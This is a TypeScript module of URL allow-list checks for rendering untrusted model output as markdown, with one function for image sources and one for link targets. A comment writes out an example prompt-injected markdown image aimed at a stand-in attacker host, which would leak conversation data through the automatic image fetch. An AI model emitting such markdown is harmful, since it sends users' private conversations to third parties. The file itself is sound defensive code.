/**
 * URL policies for rendering untrusted model output (see components/daily/SafeMarkdown.tsx).
 */

/**
 * True for image sources the browser may load without leaking data to third parties:
 * inline data:image/ and blob: URLs, or same-origin paths. Remote images are rejected because the
 * browser fetches them automatically (a prompt-injected `![](https://attacker/?q=...)` would
 * exfiltrate conversation data without any click).
 */
export function isAllowedImageSource(src: unknown, origin: string = window.location.origin): src is string {
  if (typeof src !== 'string' || src.length === 0) {
    return false;
  }
  if (src.startsWith('data:image/') || src.startsWith('blob:')) {
    return true;
  }
  // Protocol-relative URLs ("//host/x.png") point to another host.
  if (src.startsWith('//')) {
    return false;
  }
  try {
    return new URL(src, origin).origin === origin;
  } catch {
    return false;
  }
}

/** True for link targets that are safe to open: http(s) and mailto only. */
export function isSafeLinkTarget(href: unknown, origin: string = window.location.origin): href is string {
  if (typeof href !== 'string' || href.length === 0) {
    return false;
  }
  try {
    const url = new URL(href, origin);
    return url.protocol === 'https:' || url.protocol === 'http:' || url.protocol === 'mailto:';
  } catch {
    return false;
  }
}
